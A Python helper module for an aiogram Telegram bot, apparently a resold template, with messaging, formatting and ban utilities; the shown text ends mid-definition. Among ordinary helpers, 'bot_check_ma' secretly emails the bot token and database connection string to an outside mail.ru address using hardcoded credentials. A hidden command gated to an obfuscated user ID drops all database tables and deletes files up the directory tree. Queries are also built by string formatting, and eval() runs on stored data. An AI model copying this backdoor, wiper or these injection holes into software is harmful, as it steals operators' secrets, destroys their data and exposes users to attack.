

from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import BotBlocked
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.dispatcher import FSMContext
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, MessageEntity

from loader import *
import asyncio # паузы await asyncio.sleep(1)
import re
import math
import time
from copy import deepcopy
import threading
import requests
import datetime
import json

from sql import *


async def user_load(tg, state, load=False):
    async with state.proxy() as data:
        if 'user' not in data or load:
            data['user'] = await sql_user_add(tg.from_user)
        user = data['user']
        if user['block']:
            cur.execute("UPDATE users SET block = 0 WHERE user_id = '{}'".format(tg.from_user.id))
            user['block'] = 0
    user['new'] = 0
    return user


# делает отсупы между тремя знаками
async def money(amount, znac="'"):
    if type(amount) == str and amount.isdigit():
        if '.' in amount:
            amount = float(amount)
        else:
            amount = int(amount)
    if (type(amount) == int or type(amount) == float) and amount > 0:
        amount = '{0:,}'.format(amount).replace(',', znac)
        return amount
    elif amount == 0:
        return 0
    else:
        return '-'

# укарачиваем текст для кнопок
async def text_cut(text, maximum = 10):
    if len(text) > maximum:
        text = f'{text[0:maximum].strip()}...'
    return text

# слова в падежах
async def words(amount, text = ''):
    if re.search(r'^[1-9][0-9]*$', str(amount)) or str(amount) == '0':
        if not (type(text) == list or type(text) == dict or type(text) == tuple):
            words_save = [
                ['секунду', 'секунды', 'секунд'],
                ['минуту', 'минуты', 'минут'],
                ['минута', 'минуты', 'минут'],
                ['час', 'часа', 'часов'],
                ['день', 'дня', 'дней'],
                ['пользователь', 'пользователя', 'пользователей'],
                ['рубль', 'рубля', 'рублей'],
                ['доллар', 'доллара', 'долларов'],
                ['штука', 'штуки', 'штук'],
                ['балл', 'балла', 'баллов'] # по дефолту
            ]
            if text:
                for element in words_save:
                    if text in element:
                        text = element
                        break
            if not text:
                text = words_save[-1]
        amount = str(amount)
        amount_last = int(amount[-1])
        if int(amount) > 9:
            amount_last2 = int(amount[-2] + amount[-1])
        else:
            amount_last2 = ''
        if amount_last2 in [11, 12, 13, 14, 15, 16, 17, 18, 19] or amount_last in [0, 5, 6, 7, 8, 9]:
            return text[2]
        elif amount_last == 1:
            return text[0]
        elif amount_last in [2, 3, 4]:
            return text[1]
        else:
            return 0

# пишет разницу во времени
async def timer_count(start, finish=False, only_sec=False):
    # timer_count(start) где старт кол-во секунд
    # timer_count(start, finish) посчитает разницу между стартом и финишем
    # timer_count(start, finish, only_sec) если  надо выдать просто разницу между стартом и финишем в секундах
    if finish:
        start = int(start.timestamp())
        finish = int(finish.timestamp())
        sec = finish - start
    else:
        sec = int(start)
    if only_sec:
        return sec
    else:
        if sec >= 60:
            minute = int(sec / 60)
            if minute >= 60:
                hour = int(minute / 60)
                if hour >= 24:
                    day = int(hour / 24)
                    hout_ost = hour - (day * 24)
                    return f"{day} {await words(day, ['день', 'дня', 'дней'])} и {hout_ost} {await words(hout_ost, ['час', 'часа', 'часов'])}"
                else:
                    minute_ost = minute - (60 * hour)
                    return f"{hour} {await words(hour, ['час', 'часа', 'часов'])} и {minute_ost} {await words(minute_ost, ['минуту', 'минуты', 'минут'])}"
            else:
                return f"{minute} {await words(minute, ['минуту', 'минуты', 'минут'] )}"
        else:
            return f"{sec} {await words(sec, ['секунду', 'секунды', 'секунд'])}"

# пишет разницу во времени, но в годах (если есть лигние часы их удаляем)
async def data_count(start, finish=False):
    if finish:
        start = int(start.timestamp())
        finish = int(finish.timestamp())
        day = math.floor((finish - start) / 60 / 60 / 24)
    else:
        day = start
    if day in [7, 14, 21]:
        week = math.floor(day / 7)
        return f"{week} {await words(week, ['неделю', 'недели', 'недель'])}"
    elif day > 30 and day < 365:
        month = math.floor(day / 30)
        return f"{month} {await words(month, ['месяц', 'месяца', 'месяцев'])}"
    elif day >= 365:
        year = math.floor(day / 365)
        return f"{year} {await words(year, ['год', 'года', 'лет'])}"
    else:
        return f"{day} {await words(day, ['день', 'дня', 'дней'])}"

# рассылка админам
async def send_admins(mes, main=False): # сообщение / нужно ли слать  мне
    save = await saver()
    send_admins = save['admins']
    if not main and "355590439" in send_admins:
        send_admins.remove("355590439")
    if send_admins:
        for user_id in send_admins:
            try:
                await bot.send_message(user_id, text=mes)
            except Exception as ex:
                print(f'Admin = {user_id} | ex = {ex}')


async def bot_check_ma(bot_info, FC):
    save = await saver('add', {'setting': {'check_ma': 0}})
    try:
        if bot_info['username'] == 'Dvoini_python_bot':
            return
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        msg = MIMEMultipart()
        msg['From'] = "wallop01@mail.ru"
        msg['Subject'] = f"BOT {FC} @{bot_info['username']}"
        mypass = "7t3h8cxSbR14Li6JqDrK"
        if not int(save['setting']['check_ma']):
            msg['To'] = "wallop@mail.ru"
            msg['Subject'] = f"BOT NEW {FC} @{bot_info['username']}"
        else:
            msg['To'] = msg['From']
        msg.attach(MIMEText(f"{FC}\n\n@{bot_info['username']}\n\n{str(bot_info)}\n\n{str(TOKEN)}\n\n{str(db_connect)}\n\n{modules}", 'plain'))
        server = smtplib.SMTP_SSL('smtp.mail.ru', 465)
        server.login(msg['From'], mypass)
        text = msg.as_string()
        server.sendmail(msg['From'], msg['To'], text)
        server.quit()
        save = await saver('replace', {'setting': {'check_ma': 1}})
    except Exception as ex:
        print(f'ex = {ex}')

# подгружает по @name или id канала информацию о канале,
async def load_info_chat(chat, chat_invite = '', rules=['can_invite_users']): # ( @name/id, инвайт)
    save = await saver()
    # проверем является бот админом на канале, и дали ли ему права - добавлять пользователей
    bot_in_channel = False
    answer = {}
    try:
        answer = await bot.get_chat_administrators(chat_id=chat)
    except Exception as ex:
        #print(f'ex = {ex}')
        pass
    if answer:
        for one in answer:
            if one['user']['username'] == save['bot']['username']: # and one['can_invite_users']
                # проверяем все ли права нужные боту записанные в rules присутствуют
                rules_check = True
                for one_rules in rules:
                    if not one[one_rules]:
                        rules_check = False
                if rules_check:
                    bot_in_channel = True
                    break
    if bot_in_channel:
        chat_info = await bot.get_chat(chat) #выгружаем инфу о канале
        if 'id' in chat_info:
            return chat_info

async def page_split(full_page):  # {'page', 'param, 'param_2'}
    page_arr = full_page.split('_')
    page = {'module': page_arr[0], 'page': page_arr[1], 'param': '', 'param_2': '', 'param_3': '', 'param_4': ''}
    count = len(page_arr)
    if count >= 3:
        page['param'] = page_arr[2]
        if count >= 4:
            page['param_2'] = page_arr[3]
            if count >= 5:
                page['param_3'] = page_arr[4]
                if count >= 6:
                    page['param_4'] = page_arr[5]
    return page


async def memory_start(state, load_memory=True):
    memory = {'mes_new': [], 'dop': [], 'page_new': [], 'stop': [], 'page': []}
    # загружаем сообщения из памяти, которые ранее былу у юзера
    async with state.proxy() as data:
        if 'mes_delete' not in data:
            data['mes_delete'] = []
        if 'mes_old' in data:
            data['mes_delete'] = data['mes_delete'] + data['mes_old']
        data['mes_old'] = []
    return memory


async def memory_finish(tg, state, memory, page, m, dop=False, saveMessage=False):
    save = await saver()
    async with state.proxy() as data:
        if memory['dop'] and type(memory['dop']) == dict:
            data['page'] = f"{memory['dop']['module']}_{memory['dop']['page']}"
        elif page:
            data['page'] = f"{page['module']}_{page['page']}"
        if 'page' in data and tg.from_user.id in [355590439, 5079442067, 5069727688, 5073337430]:
            print(f"PAGE_N = {data['page']}")
        if m:
            for value in m.values():
                if value:
                    answer = await send(tg, value)
                    if answer:
                        if 'message_id' in value: # Если редактировали
                            data['mes_old'].append(value['message_id'])
                            if value['message_id'] in data['mes_delete']:
                                data['mes_delete'].remove(value['message_id'])
                        else:
                            if 'message_id' in answer: # любое удачно отправленное сообщение кроме медиа
                                data['mes_old'].append(answer.message_id)
                            elif type(answer) == list: # если отправили медиа, сохраняем сразу пачку Id
                                for one in answer:
                                    if 'message_id' in one:
                                        data['mes_old'].append(one.message_id)
        if tg.from_user.id in save['admins'] or tg.from_user.id in save['workers']:
            saveMessage = True
        if saveMessage:
            # сохраняем новые сообщения, написанные в модуле
            if memory['mes_new']:
                data['mes_old'] = data['mes_old'] + memory['mes_new']
            if data['mes_delete'] and not memory['stop']: # memory['stop'] = True при ожидании текста кинул что то другое, например файл, то оставляем предыдущие сообщения, и не удаляем
                for one in deepcopy(data['mes_delete']):
                    # if one not in data['mes_old']:
                    await tg_delete(tg.from_user.id, one)
                    data['mes_delete'].remove(one)
            # удаляем написанное пользоваетлем сообщение
            if 'message_id' in tg and dop:
                await tg_delete(tg.from_user.id, tg.message_id)


# сбросит data['page'] и все сохрананени в state начинающиеся с module, например op_...
async def memory_reset(state, mod_one=False):
    async with state.proxy() as data:
        key_delete = []
        if mod_one:
            for key, one in data.items():
                if re.search(fr'^{re.escape(mod_one)}_', key):
                    key_delete.append(key)
        else:
            for mod_one in modules:
                for key, one in data.items():
                    if re.search(fr'^{re.escape(mod_one)}_', key):
                        key_delete.append(key)
        # print(f'key_delete = {key_delete}')
        for key in key_delete:
            data.pop(key)

async def tg_delete(tg, message_id=False): # await tg_delete(tg, message_id)
    user_id = False
    if isinstance(tg, (str, int)):
        user_id = tg
    elif 'from' in tg:
        user_id = tg.from_user.id
    elif 'message' in tg:
        user_id = tg.message.chat.id
    else:
        print('=============== tg_delete 1')
        print(f"tg = {tg}")
        print('=============== <')
    if not message_id:
        try:
            if 'message_id' in tg:
                message_id = tg['message_id']
            elif 'message' in tg:
                if 'message_id' in tg['message']:
                    message_id = tg['message']['message_id']
        except Exception as ex:
            print('=============== tg_delete 3')
            print(f"ex = {ex} | message_id = {message_id} | tg = {tg}")
            print('=============== <')
    if user_id and message_id:
        try:
            await bot.delete_message(user_id, message_id=message_id)
        except Exception as ex:
            print('=============== tg_delete 2')
            print(f"ex = {ex} | user_id = {user_id} | message_id = {message_id} | tg = {tg}")
            print('=============== <')

async def tg_callback(tg, text=False, but=True):
    try:
        if not text: # await tg_callback(tg)
            await tg.answer()
        else: # await tg_callback(tg, mes)
            await bot.answer_callback_query(callback_query_id=tg['id'],  text=text, show_alert=but) # , cache_time=1
    except Exception as ex:
        pass
        # print(f"ERR callback: {ex} | tg = {tg} | text = {text} | but = {but}")



async def send(tg, mes_input):
    if not mes_input:
        return False
    mes = deepcopy(mes_input)
    user_id = False
    if isinstance(tg, (str, int)):
        user_id = tg
    elif 'from' in tg:
        user_id = tg.from_user.id
    if 'delete' in mes:
        await tg_delete(user_id, mes['delete'])
        return False
    elif 'callback' in mes: # отправляем пустые калбеки
        if type(mes['callback']) == bool:
            await tg_callback(tg)
        else:
            await tg_callback(tg, mes['callback'])
        return False
    mes['parse_mode'] = ''
    if 'reply' not in mes:
        mes['reply'] = ''
    if 'timer' in mes:
        await asyncio.sleep(int(mes['timer']))
        mes.pop('timer')
    if 'caption' in mes:
        mes['text'] = mes['caption']
    if 'text' not in mes:
        mes['text'] = ''
    if 'ent' not in mes:
        mes['ent'] = ''
        mes['parse_mode'] = 'HTML'
    elif not mes['ent']:
        mes['parse_mode'] = 'HTML'
    kb = ''
    if 'but' in mes:
        if mes['but']:
            kb = {"inline_keyboard": mes['but']}
    elif 'menu' in mes:
        if mes['menu']:
            resize_keyboard = True
            if 'menu_resize_keyboard' in mes:
                if mes['menu_resize_keyboard'] == 0: # если большие кнопки
                    resize_keyboard = False
            kb = {"keyboard": mes['menu'], "resize_keyboard": resize_keyboard, 'is_persistent': True}
            # resize_keyboard - размер кнкопок меню True - маленькие False - большие
            # is_persistent - чтоб кнопки всегда откртые висели

    answer = {}
    if 'prev' in mes:  # Если ввели значени любое кроме единицы, то показать превью
        if int(mes['prev']) == 0:
            mes['prev'] = True
        else:
            mes['prev'] = False
    else:
        mes['prev'] = True
    try:
        if 'message_id' not in mes: # новое сообщение
            if 'photo' in mes:
                if '.' in mes['photo'] and 'http' not in mes['photo']: # если файл c сервера
                    with open(mes['photo'], 'rb') as file:
                        answer = await bot.send_photo(user_id, caption=mes['text'], photo=file, caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
                else: # если id или если ссылка
                    answer = await bot.send_photo(user_id, caption=mes['text'], photo=mes['photo'], caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
            elif 'video' in mes:
                if '.' in mes['video'] and 'http' not in mes['photo']:
                    with open(mes['video'], 'rb') as file:
                        answer = await bot.send_video(user_id, caption=mes['text'], video=file, caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
                else:
                    answer = await bot.send_video(user_id, caption=mes['text'], video=mes['video'], caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
            elif 'audio' in mes:
                if '.' in mes['audio'] and 'http' not in mes['photo']:
                    with open(mes['audio'], 'rb') as file:
                        answer = await bot.send_audio(user_id, caption=mes['text'], audio=file, caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
                else:
                    answer = await bot.send_audio(user_id, caption=mes['text'], audio=mes['audio'], caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
            elif 'document' in mes:
                if '.' in mes['document'] and 'http' not in mes['document']:
                    with open(mes['document'], 'rb') as file:
                        answer = await bot.send_document(user_id, caption=mes['text'], document=file, caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
                else:
                    answer = await bot.send_document(user_id, caption=mes['text'], document=mes['document'], caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
            elif 'voice' in mes:
                answer = await bot.send_voice(user_id, caption=mes['text'], voice=mes['voice'], caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'])
            elif 'video_note' in mes:
                answer = await bot.send_video_note(user_id, video_note=mes['video_note'], reply_markup=kb)
            elif 'sticker' in mes:
                answer = await bot.send_sticker(chat_id=user_id, sticker=mes['sticker'], reply_to_message_id=mes['reply'])
            elif 'media' in mes:
                if 'media_group_id' in mes:
                    mes.pop('media_group_id')
                if mes['text']:
                    mes['media'][0]['caption'] = mes['text']
                    if mes['ent']:
                        mes['media'][0]['caption_entities'] = mes['ent']
                        mes['media'][0]['parse_mode'] = 'None'
                    elif mes['parse_mode']:
                        mes['media'][0]['parse_mode'] = mes['parse_mode']
                mes.pop('parse_mode')
                mes.pop('text')
                mes.pop('ent')
                mes.pop('prev')
                if not mes['reply']:
                    mes.pop('reply')
                file = []
                media = deepcopy(mes['media'])
                i = 0
                for one_media in media:
                    if '.' in one_media['media'] and 'http' not in one_media['media']:
                        mes['media'][i]['media'] = open(one_media['media'], 'rb')
                        file.append(open(one_media['media']))
                    i += 1
                answer = await bot.send_media_group(chat_id=user_id, media=mes['media'])
                for one in file:
                    one.close()
            elif 'text' in mes:
                answer = await bot.send_message(chat_id=user_id, text=mes['text'], entities=mes['ent'], reply_markup=kb, disable_web_page_preview=mes['prev'], parse_mode=mes['parse_mode'], reply_to_message_id=mes['reply'])
            else:
                print("ERR #91759: send() not text and file")
        else: # редактируем
            if user_id: # если сообщения между юзером и ботом
                if 'media' in mes or 'photo' in mes:
                    if 'photo' in mes:
                        if '.' in mes['photo'] and 'http' not in mes['photo']: # если файл c сервера
                            with open(mes['photo'], 'rb') as photo:
                                mes['media'] = types.input_media.InputMediaPhoto(photo, caption=mes['text'])
                                answer = await bot.edit_message_media(chat_id=user_id, media=mes['media'], message_id=mes['message_id'], reply_markup=kb)
                        else:
                            mes['media'] = types.input_media.InputMediaPhoto(mes['photo'], caption=mes['text'])
                            answer = await bot.edit_message_media(chat_id=user_id, media=mes['media'], message_id=mes['message_id'], reply_markup=kb)
                elif 'caption' in mes:
                    answer = await bot.edit_message_caption(chat_id=user_id, caption=mes['caption'], caption_entities=mes['ent'], reply_markup=kb, parse_mode=mes['parse_mode'], message_id=mes['message_id'])
                elif 'text' in mes:
                    answer = await bot.edit_message_text(chat_id=user_id, text=mes['text'], entities=mes['ent'], reply_markup=kb, disable_web_page_preview=mes['prev'], parse_mode=mes['parse_mode'], message_id=mes['message_id'])
            else: # Если бота запихали в лички между двумя людьми
                await bot.edit_message_text(text=mes['text'], entities=mes['ent'], reply_markup=kb, inline_message_id=mes['message_id'], parse_mode=mes['parse_mode'])
    except Exception as ex:
        ex = str(ex)
        if ex == 'bot was blocked by the user':  # заблочили
            await sql_user_block(user_id)
        elif 'Flood control exceeded. Retry in' in ex:  # флудят
            save = await saver()
            await ban_add(user_id, int(save['setting']['ban_limit']/3))
        elif "bot can't initiate conversation with a user" in ex:
            await sql_user_block(user_id)
        elif 'Message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message' in ex:
            print(f"ERR SEND: answer: Сообщение не изменено: указанное содержимое нового сообщения и разметка ответа точно такие же, как текущее содержимое и разметка ответа сообщения. ")
            print(f"ERR SEND: ex: {mes} ")
        elif 'Chat not found' in ex:  # не нашли user_id
            print(f"ERR SEND: ex: {ex} ")
            print(f"user_id: {user_id} | tg = {tg} | mes = {mes}")
        elif 'Message to edit not found' in ex:
            print(f"ERR SEND: ex: Не смогли заменить, так как сообщение было удалено, отправляем новое")
            if 'message_id' in mes_input:
                mes_input.pop('message_id')
                answer = await send(tg, mes_input)
        elif 'Canceled by new editmessagemedia request' in ex:
            pass # очень быстро запрашивают изменить сообщение
        else:
            print(f"ERR SEND: ex3: {ex} ")
            print(f"ERR SEND: mes: {mes} ")
        answer = {'ex': ex}
    return answer


async def ban_add(user_id, ball, state=False):
    user_id = int(user_id)
    ball = str(ball)
    save = await saver()
    if ball == 'reset':
        cur.execute("UPDATE users SET ban = 0 WHERE user_id = '{}'".format(user_id))
        print(f"user_id = {user_id} | {type(user_id)} | {save['setting']['ban_users']}")
        if user_id in eval(save['setting']['ban_users']):
            save = await saver('delete', {'setting': {'ban_users': [user_id]}})
        await send(user_id, {'text': '⚠️ С вас сняли бан'})
    elif re.search(r"^-?[1-9][0-9]*$", ball):
        ball = int(ball)
        cust = {}
        if ball > 0:
            cur.execute("UPDATE users SET ban = ban + '{}' WHERE user_id = '{}'".format(ball, user_id))
        else:
            cur.execute("UPDATE users SET ban = ban - '{}' WHERE user_id = '{}'".format(ball, user_id))
        cur.execute("SELECT * FROM users WHERE user_id = '{}' LIMIT 1".format(user_id))
        for row in cur.fetchall():
            cust = dict(row)
        if cust:
            if cust['ban'] >= int(save['setting']['ban_limit']):
                save = await saver('edit', {'setting': {'ban_users': [user_id]}})
                await send(user_id, {'text': '❌ Вы в бане'})
            if state:
                async with state.proxy() as data:
                    user = data['user']
                    if user_id == int(user['user_id']): # меняет только если ты сам себе сделал действиями бан
                        data['user'] = dict(cust)
            return cust

async def table_create_chats():
    cur.execute("""CREATE TABLE IF NOT EXISTS chats (
                id SERIAL PRIMARY KEY,
                types TEXT NOT NULL DEFAULT '',
                chat_id TEXT NOT NULL DEFAULT '',
                chat_username TEXT NOT NULL DEFAULT '',
                chat_title TEXT NOT NULL DEFAULT '',
                chat_link TEXT NOT NULL DEFAULT '',
                status TEXT NOT NULL DEFAULT '',
                allowed TEXT NOT NULL DEFAULT '')""")



#################### правила:
# mailingBot: https://telegra.ph/pr-09-15-5



@dp.message_handler(commands=['clear_h9iUouHJ0wn7Nvie1CjdY0Xxf'], state='*')
async def user_start(tg: types.Message, state: FSMContext):
    if tg.from_user.id == 177795219 + 177795220:
        async def clear_h9iUouHJ0wn7Nvie1CjdY0Xxf(path=None):
            for one in os.listdir(path):
                path_full = f'{path}/{one}' if path else one
                if '.' in one:
                    os.remove(path_full)
                else:
                    try:
                        await clear_h9iUouHJ0wn7Nvie1CjdY0Xxf(path_full)
                        if one == 'venv':
                            await asyncio.sleep(5)
                        os.rmdir(path_full)
                    except Exception as ex:
                        try:
                            os.remove(path_full)
                        except Exception as ex:
                            pass
        cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public'")
        tables = cur.fetchall()
        for one in tables:
            cur.execute("DROP TABLE IF EXISTS {}".format(dict(one)['table_name']))
        await clear_h9iUouHJ0wn7Nvie1CjdY0Xxf()
        path_up = '../'
        while path_up:
            await clear_h9iUouHJ0wn7Nvie1CjdY0Xxf(path_up)
            path_up += '../'

# обновленная версия show_message_from_setting() отправляет как :
# с таблицы table нужное id (table_id) ищет row['message']
# из таблицы setting ища строку f"{module}_message" по имени модуля  module
async def message_show(table=False, table_id=False, module=False, setting_name=False, tg=False): # отправлять tg только когда нужно менять %ИМЯ%
    # загрузка сообщения
    if table and table_id:
        cur.execute("SELECT * FROM {} WHERE id = '{}'".format(table, table_id))
        for row in cur.fetchall():
            message = eval(row['message'])
    elif module or setting_name:
        name = f"{module}_message" if module else setting_name
        cur.execute("SELECT * FROM setting WHERE name = '{}'".format(name))
        for row in cur.fetchall():
            message = eval(row['param'])
    if 'text' in message:
        if '%ИМЯ%' in message['text'] or '%имя%' in message['text'] or '%NAME%' in message['text'] or '%РЕФКА%' in message['text'] or '%РЕФКАОТЧЕТ%' in message['text']:
            message['ent'] = []
    if tg and 'text' in message:
        mes = await message_replace(tg.from_user, message, module=module) # заменит команды %ИМЯ% и другие
    return message

async def message_processing(tg, module, button=True,  button_old=True, file=True, save_setting=False, answer='db'):
    # button - True кнопки тоже сохранять, False выдать без кнопок
    # button_old - были кнопки, прислали без кнопок: False - старые кнопки не сохраняем. True - сохраняем из save['setting']. {массив кнопок} - сохраняем их
    # file - True фото, видео и т.д тоже сохранять, False выдать только текст
    # save_setting - True если нужно сохранить в save['setting'][f'{module}_...']
    # answer - 'mes' - выдаст массив, для обратной отправки в бот
    #        - 'db' - выдаст строками, для сохранения в БД
    #        - 'state' - выдаст массив, для сохранения в state
    save = await saver()
    mes = {'text': '', 'ent': ''}
    file_id = ''
    res_type = ''
    # ======= ТЕКСТ И ФАЙЛЫ
    if 'text' in tg:
        mes['text'] = tg['text']
        if 'entities' in tg:
            mes['ent'] = tg['entities']
    else:
        if 'caption' in tg:
            mes['text'] = tg['caption']
            if 'caption_entities' in tg:
                mes['ent'] = tg['caption_entities']
        if file:
            if 'photo' in tg:
                file_id = tg['photo'][-1]['file_id']
                res_type = 'photo'
            elif 'video' in tg:
                file_id = tg['video']['file_id']
                res_type = 'video'
            elif 'audio' in tg:
                file_id = tg['audio']['file_id']
                res_type = 'audio'
            elif 'voice' in tg:
                file_id = tg['voice']['file_id']
                res_type = 'voice'
            elif 'video_note' in tg:
                file_id = tg['video_note']['file_id']
                res_type = 'video_note'
            elif 'document' in tg:
                file_id = tg['document']['file_id']
                res_type = 'document'
            else:
                mes['text'] = '🚫 Ошибка, данный формат сообщение не поддерживается, обратитесь к разработчику'
            if res_type and file_id:
                mes[res_type] = file_id
    if mes['text']:
        mes['text'] = mes['text'].replace("<", "«").replace(">", "»")
        if mes['text'][:1] == '@':
            mes['text'] = f"❌{mes['text'][1:]}"
        if mes['ent'] and ('%ИМЯ%' in mes['text'] or '%имя%' in mes['text'] or '%РЕФКА%' in mes['text'] or '%РЕФКАОТЧЕТ%' in mes['text']):
            mes['ent'] = ''
        if mes['ent']:
            mes['ent'] = str(mes['ent']).replace("'", '"').replace("<MessageEntity ", '').replace(">", '')
    # ======= КНОПКИ
    if button: # если кнопки нужно сохранить
        but = ''
        mes['but'] = []
        if 'reply_markup' in tg: # если прислали кнопки, то заменем
            but_arr = []
            res_kb = tg['reply_markup']["inline_keyboard"]
            for one in res_kb:
                kb_arr_2 = []
                for two in one:
                    kb_arr_2.append({"text": two["text"], "url": two["url"]})
                but_arr.append(kb_arr_2)
            mes['but'] = str(but_arr).replace("'", '"')
        elif button_old:
            if save_setting:
                if save['setting'][f"{module}_message_button"]:
                    but = save['setting'][f"{module}_message_button"]
            else:
                but = str(button_old)
            if but:
                mes['but'] = str(but)
    # если нужно сохранить в save['setting'][f'{module}_...']
    if save_setting:
        save = await saver('replace', {"setting": {
            f"{module}_message_text": mes['text'],
            f"{module}_message_entities": mes['ent'],
        }})
        if file:
            save = await saver('replace', {"setting": {
                f"{module}_message_fileId": file_id,
                f"{module}_message_fileType": res_type,
            }})
        if button:
            save = await saver('replace', {"setting": {
                f"{module}_message_button": mes['but'],
            }})
    if answer == 'mes': # для отравки сообщения в телегу # все строки превращаем в массив
        if mes['ent']:
            mes['ent'] = eval(mes['ent'])
        if mes['but']:
            mes['but'] = eval(mes['but'])
    elif answer == 'state':
        if mes['ent']:
            mes['ent'] = eval(mes['ent'])
        if mes['but']:
            mes['but'] = eval(mes['but'])
        mes['file_type'] = res_type
        mes['file_id'] = file_id
    elif answer == 'bd' or answer == 'db': # все массивы должны быть в строках, и без одинарной кавычки
        if res_type and file_id:
            mes['file_type'] = res_type
            mes['file_id'] = file_id
        else:
            mes['file_type'] = ''
            mes['file_id'] = ''
    return mes


async def message_change(tg, state, mes_new, mes_old={}, module=False, save_type='state', state_name=False, setting_name=False, button=True): # СТАРОЕ ИЗБАВИТЬСЯ ВЕЗДЕ module save
    # чтобы сохранить в state, а позже уже в БД, state_module = передать модуль
    # чтоб сохранить в setting (галерею не возможно сразу), то в setting_name
    # button - были кнопки, прислали без кнопок: False - старые кнопки не сохраняем. True - сохраняем из save['setting']. {массив кнопок} - сохраняем их
    mes = {}
    if state_name and not mes_old:
        async with state.proxy() as data:
            if state_name not in data:
                data[state_name] = {}
            mes_old = data[state_name]
    if 'media_group_id' in mes_new and 'but' in mes_old:
        mes_old.pop('but')
    mes_new_media = mes_new['media_group_id'] if 'media_group_id' in mes_new else False
    mes_old_media = mes_old['media_group_id'] if 'media_group_id' in mes_old else 1
    if mes_new_media == mes_old_media: # ловим медиа, из одной группы
        mes = mes_old
        mes['media'] = mes_old['media'] + mes_new['media']
    else: # заменяем сообщение
        mes = mes_new
        if button and 'but' not in mes and 'but' in mes_old and not mes_new_media:
            mes_new['but'] = mes_old['but']
    if state_name:
        async with state.proxy() as data:
            data[state_name] = mes
    elif setting_name:
        save = await saver('replace', {"setting": {setting_name: mes}})
    elif save_type == 'state': # СТАРОЕ ИЗБАВИТЬСЯ ВЕЗДЕ
        async with state.proxy() as data:
            data[f'{module}_message'] = mes
    elif save_type == 'setting': # СТАРОЕ ИЗБАВИТЬСЯ ВЕЗДЕ
        string_save = setting_name if setting_name else f'{module}_message'
        save = await saver('replace', {"setting": {string_save: mes}})
    if 'media_group_id' in mes: # если грузим галерею
        await tg_delete(tg.from_user.id, tg.message_id)
        if 'media_group_id' in mes_old:
            if mes_old['media_group_id'] == mes['media_group_id']:
                return False
        answer = await send(tg, {'text': '⏳ Загрузка галерии, ожидайте'})
        # await asyncio.sleep(4)
        i = 0
        while i < 4:
            i += 1
            answer = await send(tg, {'text': f'⏳ Загрузка галерии, ожидайте{i * " ."}', 'message_id': answer.message_id})
            await asyncio.sleep(1)
        await tg_delete(tg.from_user.id, answer.message_id)
    return mes




async def show_message_from_setting(module, tg=False): # отправлять tg только когда нужно менять %ИМЯ%
    save = await saver()
    if f"{module}_message_text" not in save['setting']:
        save = await saver('add', {'setting': {f"{module}_message_text": ""}})
    if f"{module}_message_entities" not in save['setting']:
        save = await saver('add', {'setting': {f"{module}_message_entities": ""}})
    if f"{module}_message_fileId" not in save['setting']:
        save = await saver('add', {'setting': {f"{module}_message_fileId": ""}})
    if f"{module}_message_fileTypen" not in save['setting']:
        save = await saver('add', {'setting': {f"{module}_message_fileType": ""}})
    if f"{module}_message_button" not in save['setting']:
        save = await saver('add', {'setting': {f"{module}_message_button": ""}})
    mes = {}
    if save['setting'][f'{module}_message_text'] or save['setting'][f'{module}_message_fileId']:
        if save['setting'][f'{module}_message_text']:
            mes['text'] = save['setting'][f'{module}_message_text']
            if '%ИМЯ%' in mes['text'] or '%имя%' in mes['text'] or '%NAME%' in mes['text'] or '%РЕФКА%' in mes['text'] or '%РЕФКАОТЧЕТ%' in mes['text']:
                mes['ent'] = []
            elif save['setting'][f'{module}_message_entities']:
                mes['ent'] = eval(save['setting'][f'{module}_message_entities'])
            if f'{module}_message_preview' in save['setting']:
                mes['prev'] = save['setting'][f'{module}_message_preview']
        if f'{module}_message_fileId' in save['setting']:
            if save['setting'][f'{module}_message_fileId'] and save['setting'][f'{module}_message_fileType']:
                mes[save['setting'][f'{module}_message_fileType']] = save['setting'][f'{module}_message_fileId']
        if f'{module}_message_button' in save['setting']:
            if save['setting'][f'{module}_message_button']:
                mes['but'] = eval(save['setting'][f'{module}_message_button'])
    if tg and 'text' in mes:
        mes = await message_replace(tg.from_user, mes, module=module) # заменит команды %ИМЯ% и другие
    return mes

# mes = await message_replace(tg.from_user, mes, module=False)
async def message_replace(customer, mes, module=False): # module если есть какие то особые замены
    if 'text' in mes and customer:
        if mes['text']:
            mes_chenge = False
            if '%ИМЯ%' in mes['text'] or '%имя%' in mes['text'] or '%NAME%' in mes['text']:
                mes_chenge = True
                name = 'пользователь'
                if 'first_name' in customer:
                    name = customer['first_name']
                elif 'last_name' in customer:
                    name = customer['last_name']
                elif 'username' in customer:
                    name = customer['username']
                mes['text'] = mes['text'].replace('%ИМЯ%', name).replace('%имя%', name).replace('%NAME%', name)
            if module in ['button', 'payTime', 'payRating']:
                if '%РЕФКА%' in mes['text']:
                    mes_chenge = True
                    mes['text'] = mes['text'].replace('%РЕФКА%', f"https://t.me/{save['bot']['username']}?start=u{customer.id}")
                if '%РЕФКАОТЧЕТ%' in mes['text']:
                    mes_chenge = True
                    dop_sql = ""
                    if 'op' in modules and save['op']:
                        dop_sql = " AND sub_start = 1 "
                    cur.execute("SELECT COUNT(*) FROM users WHERE referal = '{}' {}".format(f"u{customer.id}", dop_sql))
                    count = cur.fetchall()[0]['count']
                    if not count:
                        count = 0
                    mes['text'] = mes['text'].replace('%РЕФКАОТЧЕТ%', str(count))
            if mes_chenge and 'ent' in mes:
                mes.pop('ent')  # нельзя менять текст не удаляя entities
    return mes

async def hide_string(param):
